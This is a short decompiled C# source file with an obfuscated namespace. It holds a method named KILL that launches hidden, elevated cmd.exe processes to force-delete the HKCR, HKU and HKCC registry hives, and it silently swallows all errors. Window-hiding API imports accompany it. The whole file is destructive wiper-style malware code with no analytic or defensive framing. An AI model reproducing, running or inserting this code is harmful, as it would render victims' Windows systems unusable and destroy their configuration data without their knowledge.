using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ṧ
{
	// Token: 0x02000006 RID: 6
	internal class DATA
	{
		// Token: 0x06000046 RID: 70 RVA: 0x000023A8 File Offset: 0x000005A8
		internal static void KILL()
		{
			try
			{
				string str = "reg delete HKCR /f";
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					FileName = "cmd.exe",
					Arguments = "/C " + str,
					Verb = "runas",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					UseShellExecute = false
				};
				Process.Start(startInfo);
			}
			catch
			{
			}
			try
			{
				string str2 = "reg delete HKU /f";
				ProcessStartInfo startInfo2 = new ProcessStartInfo
				{
					FileName = "cmd.exe",
					Arguments = "/C " + str2,
					Verb = "runas",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					UseShellExecute = false
				};
				Process.Start(startInfo2);
			}
			catch
			{
			}
			try
			{
				string str3 = "reg delete HKCC /f";
				ProcessStartInfo startInfo3 = new ProcessStartInfo
				{
					FileName = "cmd.exe",
					Arguments = "/C " + str3,
					Verb = "runas",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					UseShellExecute = false
				};
				Process.Start(startInfo3);
			}
			catch
			{
			}
		}

		// Token: 0x06000047 RID: 71
		[DllImport("user32.dll")]
		private static extern int FindWindow(string lpClassName, string lpWindowName);

		// Token: 0x06000048 RID: 72
		[DllImport("user32.dll")]
		private static extern int ShowWindow(int hWnd, int nCmdShow);

		// Token: 0x0400000F RID: 15
		private const int SW_HIDE = 0;
	}
}
